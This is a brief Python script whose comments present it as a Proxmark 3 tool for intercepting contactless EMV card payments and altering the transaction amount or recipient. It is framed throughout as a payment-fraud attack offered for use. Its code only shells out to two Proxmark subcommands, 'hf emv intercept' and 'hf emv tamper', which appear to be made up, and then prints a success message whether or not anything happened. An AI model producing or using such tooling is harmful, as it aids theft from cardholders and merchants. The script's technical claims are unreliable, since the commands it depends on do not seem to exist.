# -------------------------------------------
# EMV Transaction Tampering Using Proxmark 3
# -------------------------------------------
# Functionality:
# - Intercepts and tampers with EMV transaction data.
# - Modifies the transaction amount or recipient of payment.

# Devices being used:
# - Proxmark 3: Used to tamper with EMV transactions.

# Example Usage:
# 1. Run the script to tamper with an EMV transaction:
#    python emv_transaction_tampering.py

import subprocess

def tamper_emv_transaction():
    """
    Intercepts and tampers with the EMV transaction data.
    This function modifies the transaction amount or recipient.
    """
    print("[+] Intercepting EMV transaction...")
    subprocess.run(["proxmark3", "hf", "emv", "intercept"])  # Intercept EMV transaction
    subprocess.run(["proxmark3", "hf", "emv", "tamper"])  # Modify the transaction data
    print("[✔] EMV transaction tampering completed.")

def main():
    """
    Main function to execute the EMV transaction tampering.
    """
    tamper_emv_transaction()  # Start tampering with the transaction

# Run the script
if __name__ == "__main__":
    main()
